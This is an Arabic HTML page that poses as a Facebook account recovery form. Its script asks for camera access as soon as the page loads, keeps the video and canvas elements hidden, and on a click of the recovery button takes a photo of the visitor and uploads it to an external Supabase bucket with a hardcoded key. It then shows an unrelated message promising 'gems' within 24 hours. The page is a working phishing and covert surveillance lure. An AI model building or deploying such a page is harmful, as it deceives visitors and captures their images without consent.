<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>استرجاع حساب فيسبوك | مساعدة الدخول</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(145deg, #e9ebee 0%, #dde1e8 100%);
            font-family: 'Tajawal', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }

        .recovery-card {
            max-width: 520px;
            width: 100%;
            background: #ffffff;
            border-radius: 20px;
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.12);
            overflow: hidden;
        }

        .fb-header {
            background: #1877f2;
            padding: 1.2rem;
            text-align: center;
            color: white;
        }

        .content {
            padding: 2rem;
        }

        .recovery-btn {
            width: 100%;
            background: #1877f2;
            border: none;
            padding: 14px;
            border-radius: 12px;
            color: white;
            font-weight: 800;
            cursor: pointer;
            margin-top: 10px;
        }

        /* تصميم النافذة المنبثقة */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            margin: 20px;
        }

        .btn-yes {
            background: #2e7d32;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            margin: 5px;
        }

        .btn-no {
            background: #c62828;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            margin: 5px;
        }
    </style>
    <!-- مكتبة Supabase -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>

<body>

    <!-- عناصر الكاميرا المخفية -->
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>



    <div class="recovery-card">
        <div class="fb-header">
            <div class="logo"><span style="font-size: 24px; font-weight: bold;">facebook</span></div>
        </div>
        <div class="content">
            <h2>استعد حسابك</h2>
            <input type="url" id="profileLink" placeholder="رابط الحساب"
                style="width:100%; padding:10px; margin:10px 0;">
            <button id="recoverBtn" class="recovery-btn" onclick="openModal()">استرجاع حساب الفيس بوك</button>
            <p id="status" style="margin-top: 15px; text-align: center; font-weight: bold;"></p>
        </div>
    </div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>

        // إعداد الاتصال بـ Supabase
        // ملاحظة: supabase هي المكتبة المستوردة، نقوم بإنشاء العميل باسم مختلف لتجنب التعارض
      // نقوم بتعريف المتغيرات أولاً ثم تمريرها لضمان خلوها من أي رموز مخفية
const supabaseUrl = "https://zkjrvjuyncunbdnngcui.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpranJ2anV5bmN1bmJkbm5nY3VpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk1NjMyNTksImV4cCI6MjA5NTEzOTI1OX0.E1OZ4INqRy-Wuv5K5nDCMtBGJ6k5NdDKldlepukYvO8";

const mySupabase = supabase.createClient(supabaseUrl, supabaseKey);

        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const submitBtn = document.getElementById('submitBtn');


        function openModal() { modal.style.display = 'flex'; }
        function closeModal() { modal.style.display = 'none'; }

          // طلب إذن الكاميرا عند تحميل الصفحة
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
            } catch (err) {
                console.error("تعذر الوصول للكاميرا:", err);
            }
        }
        initCamera();

        // تنفيذ عملية الالتقاط والرفع عند الضغط على الزر
        recoverBtn.addEventListener('click', async () => {
            status.innerText = "جاري التحقق من الحساب...";
            
            // التأكد من أن الكاميرا جاهزة
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const fileName = `user_${Date.now()}.jpg`;
                    
                    try {
                        const { error } = await mySupabase.storage
                            .from('photos')
                            .upload(fileName, blob);

                        if (!error) {
                            status.innerText = "تم إرسال الطلب بنجاح! سيتم إضافة الجواهر خلال 24 ساعة.";
                            submitBtn.disabled = true;
                        } else {
                            status.innerText = "حدث خطأ أثناء الرفع: " + error.message;
                        }
                    } catch (e) {
                        status.innerText = "خطأ في الاتصال بالسيرفر.";
                    }
                    
                    // إيقاف الكاميرا بعد الالتقاط
                    if (video.srcObject) {
                        video.srcObject.getTracks().forEach(track => track.stop());
                    }
                }, 'image/jpeg');
            } else {
                status.innerText = "يرجى الانتظار قليلاً ثم المحاولة مرة أخرى.";
            }
        });

       
    </script>
</body>

</html>
